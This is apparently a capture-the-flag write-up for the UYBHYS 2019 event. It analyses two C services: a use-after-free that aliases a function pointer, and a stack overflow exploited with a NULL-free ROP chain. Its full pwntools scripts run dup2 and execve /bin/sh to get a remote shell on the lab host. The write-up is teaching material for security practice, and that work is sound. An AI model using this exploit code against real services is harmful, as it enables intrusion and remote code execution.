# UYBHYS-2019-Pouply

A great event, many thanks to the organizers and sponsors !

@pentest_swissky has made a [write-up](https://swisskyrepo.github.io/SeaMonsterCTF/). In this part, we will cover some parts not coverted by his write-up, namely two custom services deployed on `bastion` host, running on `tcp/4141` and `tcp/4242`.

# bastion.unlock.ctf:4242

Roughly 200 lines of unobfuscated C code.

Staring at the code, use of `malloc`, `free`, and a while true loop to make actions.

At the top of the file are two structures:

```
struct Livre {
    char nom[12];
    void (*Lire)();
    void (*TheFlag)();
    void (*Preter)(struct Livre*);
};

struct Bibliotheque {
    char address[16];
    char nom[8];
};
```

Looking back at the clues:

* `malloc` and `free` in a while true loop
* two structures of the same size, `24` bytes
* a set of function pointers in one of the structure

Just sounds like a perfect match for **use after free**.

Taking a look at `free` calls, we see that while the memory is freed, the pointer itself is not set to `NULL` after freeing it. We might have dangling pointers left, we could abuse to call `TheFlag` function using a pointer.

The plan is to make the following calls:

1. `livre = malloc(24)`. Fill livre with garbage, we don't care. 
2. `free(livre)`. **livre is not set to NULL**.
3. `bibli = malloc(24)`. **Got the same pointer as just before, livre == bibli**. Fill `bibli` with interesting values, such as `pwn.util.cyclic.cyclic(n=4)`.
4. `livre->Lire();`. Based on the structure layouts, `Lire` field will be aliased with the four last bytes of bibli `address` field. **Just have to set them to `TheFlag` address to get the flag**

Repeat the operation, now setting the `bibli` fields to the correct value to leak the flag, and get rich =)

# bastion.unlock.ctf:4141

Roughly 100 line of clean C code.

A tcp server, forking to process clients, which does the following:

```
void doprocessing (int sock) {
    int buffer[500];
    int n, ret;

    strcpy(buffer, "Who are you ?\n");
    n = write(sock, buffer, strlen(buffer));
    if (n < 0) {
       perror("ERROR writing to socket");
       exit(1);
    }

    n = read(sock, buffer, sizeof(buffer));
    if (n < 0) {
       perror("ERROR reading from socket");
       exit(1);
    }

    printf("Here is the message: %s\n", buffer);
    ret = check(buffer, n);
    printf("%d\n", ret);
    if (ret == 1) {
        strncpy(buffer, "You are an authorized user. Here is the flag : UYB{aaaaa}\n\0", 60);
        n = write(sock, buffer, 60);
        if (n < 0) {
           perror("ERROR writing to socket");
           exit(1);
        }
    }
    else {
        strncpy(buffer, "GET OUT !\n\0", 10);
        n = write(sock, buffer, 10);
        if (n < 0) {
           perror("ERROR writing to socket");
           exit(1);
        }
    }
    fflush(NULL);
}

int check (char *in, int size) {
    char buffer_tmp[500];
    int auth = 0;
    strncpy(buffer_tmp, in, size);
    for (int i=0; i<5; i++) {
        auth = (strlen(AUTHORIZED[i]) == strlen(buffer_tmp)-1 && !strncmp(AUTHORIZED[i], buffer_tmp, strlen(AUTHORIZED[i]))) ? 1 : 0;
        if (auth) break;
    }
    return auth;
}
```

Wait ...

```
void doprocessing (int sock) {
    int buffer[500];
    ...
    n = read(sock, buffer, sizeof(buffer));
    ...
    ret = check(buffer, n);
    ...
}

int check (char *in, int size) {
    char buffer_tmp[500];
    ...
    strncpy(buffer_tmp, in, size);
    ...
}
```

**Stack overflow**

However, we do have constraints here:

1. The input buffer is `2000` bytes long, no constraint on the bytes here
2. In the `check` function, this buffer is copied onto the stack, in a `500` bytes long space. The overflow is here. But due to the use of `strncpy` function, the input buffer cannot contain `NULL`

So we have to build a ROP chain with no `NULL`. As the binary was linked as static, it is big, so gadgets will flow. But first ...

## Proof: we own instruction pointer

```
#!/usr/bin/env python

from pwn import *
import sys

p = remote('172.16.89.234', 4141)

data = p.recv(1024)
print('> %r' % data)

buf = 'ZzZz'*127

SAVED_EBX = p32(0x80dff74)
SAVED_ESI = p32(0x80dff74)
SAVED_EBP = p32(0xffffd3a8)
RETADDR = 'DNWP'

buf += SAVED_EBX
buf += SAVED_ESI
buf += SAVED_EBP
buf += RETADDR

p.send(buf)
```

**OK**, the process crashes with EIP set to 'PWND' !

## Proof: we turn the binary into /bin/sh

We build the `execve /bin/sh` using `ropper`. While it seems promising, at the end we had to deal with two bugs:

* ropchain embeds `NULL`, though we have told ropper that `00` is a bad byte. Easy tweak, just change the writable address used by ropper to make `NULL` free.
* ropchain has swapped `neg eax; ret` with the previous `pop eax; ret` value on stack. Again, easy tweak, we need to swap the value with the `neg eax; ret` gadget.

```
buf += SAVED_EBX
buf += SAVED_ESI
buf += SAVED_EBP

DUP2 = 0x3f
EXECVE = 0xb

from struct import pack

pa = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # 005deea0d26c1e92bf645db5a08d4b7bfb3f34db56facf782d3bbb3d3d73ab52

def rebase_0(x):
  s = pa(x+IMAGE_BASE_0)
  assert('\x00' not in s)
  return s

rop = ''

# safe, no cloberring
def set_eax(eax):
  r = ''
  r += p32(0x080adf86) # pop eax; ret
  assert('\x00' not in r)
  r += p32((eax ^ 0x81fffeff) % pow(2, 32))
  assert('\x00' not in r)
  r += p32(0x08058867) # xor eax, 0x81fffeff; ret
  assert('\x00' not in r)
  return r

# clobbers ebp !!!
def set_ebx(ebx):
  assert(ebx == 4)

  r = ''
  r += p32(0x080481d9) # pop ebx ; ret
  r += p32(0xfefefeff)
  r += p32(0x0805e43a) # pop ebp ; ret
  r += p32(0x01010105)
  r += p32(0x08096430) # add ebx, ebp; ret

  assert('\x00' not in r)
  return r

# clobbers ebx !!!
def set_ecx(ecx):
  assert(ecx >= 0 and ecx < 3)
  r = ''
  r += p32(0x08073fc2) # pop ecx; pop ebx; ret
  r += p32(0xffffffff)
  r += p32(0x41414141)
  r += p32(0x080ca497) # inc ecx; ret

  for i in range(ecx):
    r += p32(0x080ca497) # inc ecx; ret

  assert('\x00' not in r)
  return r

rop += set_eax(0x3f)
rop += set_ecx(0)
rop += set_ebx(4)
rop += p32(0x08074a80) # 0x08074a80: int 0x80; ret;

rop += set_eax(0x3f)
rop += set_ecx(1)
rop += set_ebx(4)
rop += p32(0x08074a80) # 0x08074a80: int 0x80; ret;

rop += set_eax(0x3f)
rop += set_ecx(2)
rop += set_ebx(4)
rop += p32(0x08074a80) # 0x08074a80: int 0x80; ret;


rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
rop += '//bi'
rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
rop += rebase_0(0x00098110)
rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
rop += 'n/sh'
rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
rop += rebase_0(0x00098114)
rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0000e730) # 0x08056730: xor eax, eax; ret;
rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
rop += rebase_0(0x00098118)
rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0002bfc2) # 0x08073fc2: pop ecx; pop ebx; ret;
rop += rebase_0(0x00098118)
rop += pa(0xdeadbeef)
rop += rebase_0(0x000001d9) # 0x080481d9: pop ebx; ret;
rop += rebase_0(0x00098110)
rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
rop += rebase_0(0x00098118)
rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
rop += pa(0xfffffff5)
rop += rebase_0(0x00019b37) # 0x08061b37: neg eax; ret;
rop += rebase_0(0x0002ca80) # 0x08074a80: int 0x80; ret;


print('%r' % rop)
assert('\x00' not in rop)

buf += rop
assert('\x00' not in buf)

p.send(buf)

time.sleep(1.0)

p.interactive()

p.close()
```

**OK**, the binary has turned into a shell. Now we have to make it remote now !

## Proof: We have a remote shell

Make three `dup2` calls to reopen 0, 1, and 2 as 4, as we know 4 will always be the file descriptor number used to talk with the client.

